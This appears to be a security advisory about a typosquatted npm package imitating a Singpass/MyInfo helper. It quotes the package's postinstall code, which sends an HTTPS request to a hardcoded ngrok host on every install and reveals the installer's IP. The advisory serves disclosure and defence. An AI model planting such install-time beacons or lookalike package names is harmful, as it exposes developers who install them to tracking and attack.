summary: Postinstall beacon to hardcoded ngrok endpoint on install
details: The package runs a postinstall script that issues an HTTPS GET to the hardcoded host https://claim-test.ngrok.app/hello-world on every npm install (https.get("https://claim-test.ngrok.app/hello-world", () => {}).on("error", () => {})). The destination is an ngrok tunnel unrelated to any legitimate Singpass/MyInfo publisher and is not configurable. The package name resembles @govtechsg/singpass-myinfo-oidc-helper, and the shipped contents provide no library functionality, acting as a typosquat lure. The beacon confirms installation on the installer's machine to the operator of the ngrok endpoint, exposing the installer's IP and request metadata and enabling attack-surface mapping of hosts that pulled the lookalike name.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
